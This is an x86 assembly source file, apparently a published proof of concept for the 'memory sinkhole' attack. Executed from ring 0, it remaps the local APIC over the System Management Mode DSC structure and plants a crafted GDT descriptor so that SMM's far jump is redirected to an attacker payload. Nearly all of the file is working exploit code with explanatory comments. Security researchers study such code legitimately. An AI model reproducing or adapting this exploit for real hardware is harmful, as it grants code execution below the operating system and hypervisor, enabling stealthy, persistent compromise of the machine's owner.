; memory sinkhole proof of concept
; hijacks ring -2 execution through the apic overlay attack.

; deployed in ring 0

; the SMBASE register of the core under attack
TARGET_SMBASE equ 0x1f5ef800
 
; the location of the attack GDT.
; this is determined by which register will be read out of the APIC
; for the GDT base.  the APIC registers at this range are hardwired,
; and outside of our control; the SMM code will generally be reading 
; from APIC registers in the 0xb00 range if the SMM handler is page 
; aligned, or the 0x300 range if the SMM handler is not page aligned. 
; the register will be 0 if the SMM handler is aligned to a page 
; boundary, or 0x10000 if it is not.
GDT_ADDRESS equ 0x10000
 
; the value added to SMBASE by the SMM handler to compute the
; protected mode far jump offset.  we could eliminate the need for an
; exact value with a nop sled in the hook.
FJMP_OFFSET equ 0x8097
 
; the offset of the SMM DSC structure from which the handler loads
; critical information
DSC_OFFSET equ 0xfb00
 
; the descriptor value used in the SMM handler’s far jump
DESCRIPTOR_ADDRESS equ 0x10
 
; MSR number for the APIC location
APIC_BASE_MSR equ 0x1b
 
; the target memory address to sinkhole
SINKHOLE equ ((TARGET_SMBASE+DSC_OFFSET)&0xfffff000)
 
; we will hijack the default SMM handler and point it to a payload
; at this physical address.
PAYLOAD_OFFSET equ 0x1000

; compute the desired base address of the CS descriptor in the GDT.
; this is calculated so that the fjmp performed in SMM is perfectly
; redirected to the payload hook at PAYLOAD_OFFSET.
CS_BASE equ (PAYLOAD_OFFSET-FJMP_OFFSET)
 
; we target the boot strap processor for hijacking.
APIC_BSP equ 0x100
 
; the APIC must be activated for the attack to work.
APIC_ACTIVE equ 0x800
 
;;; begin attack ;;;
 
; clear the processor caches,
; to prevent bypassing the memory sinkhole on data fetches
wbinvd
 
; construct a hijack GDT in memory under our control
; note: assume writing to identity mapped memory.
; if non-identity mapped, translate these through the page tables first.
mov dword [dword GDT_ADDRESS+DESCRIPTOR_ADDRESS+4],
	(CS_BASE&0xff000000) | (0x00cf9a00) | 
		(CS_BASE&0x00ff0000)>>16
mov dword [dword GDT_ADDRESS+DESCRIPTOR_ADDRESS+0],
	(CS_BASE&0x0000ffff)<<16 | 0xffff
 
; remap the APIC to sinkhole SMM’s DSC structure
mov eax, SINKHOLE | APIC_ACTIVE | APIC_BSP
mov edx, 0
mov ecx, APIC_BASE_MSR
wrmsr
 
; wait for a periodic SMI to be triggered
jmp $
